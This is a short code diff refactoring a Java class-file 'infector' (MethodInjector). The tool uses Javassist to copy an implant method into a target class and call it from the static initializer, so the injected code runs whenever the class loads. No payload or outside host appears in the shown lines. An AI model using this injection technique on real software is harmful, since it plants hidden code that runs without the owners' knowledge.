@@ -1,6 +1,5 @@
 package org.example.injector;
 
-import javassist.CtClass;
 import javassist.bytecode.*;
 
 import java.io.DataOutputStream;
@@ -11,8 +10,7 @@ import java.nio.file.Path;
 import java.util.HashMap;
 import java.util.Objects;
 
-import static org.example.injector.Helpers.readClassFile;
-import static org.example.injector.Helpers.setStaticFlagForMethod;
+import static org.example.injector.Helpers.*;
 
 public class MethodInjector {
     private final ImplantHandler implantClass;
@@ -25,7 +23,8 @@ public class MethodInjector {
 
     public boolean infectTarget(final Path targetClassFilePath, final Path outputPath) throws IOException {
         final ClassFile targetClass = readClassFile(targetClassFilePath);
-        final MethodInfo methodImplant = implantClass.loadFreshConfiguredSpecimen().getMethod(implantMethodName);
+        ClassFile sourceClass = implantClass.loadFreshConfiguredSpecimen();
+        final MethodInfo methodImplant = sourceClass.getMethod(implantMethodName);
 
         // Add the implant method to target class
         MethodInfo targetImplantMethod;
@@ -50,14 +49,8 @@ public class MethodInjector {
         MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
         if (currentClinit == null) {
             // There are no static blocks in this class, create an empty one
-            currentClinit = new MethodInfo(targetClass.getConstPool(), MethodInfo.nameClinit, "()V");
-            setStaticFlagForMethod(currentClinit);
-            Bytecode stubCode = new Bytecode(targetClass.getConstPool(), 0, 0);
-            stubCode.addReturn(CtClass.voidType);
-            currentClinit.setCodeAttribute(stubCode.toCodeAttribute());
-
             try {
-                targetClass.addMethod(currentClinit);
+                currentClinit = createAndAddClassInitializerStub(targetClass);
             } catch (DuplicateMemberException e) {
                 throw new RuntimeException("Internal error: clinit already exist despite not existing", e);
             }
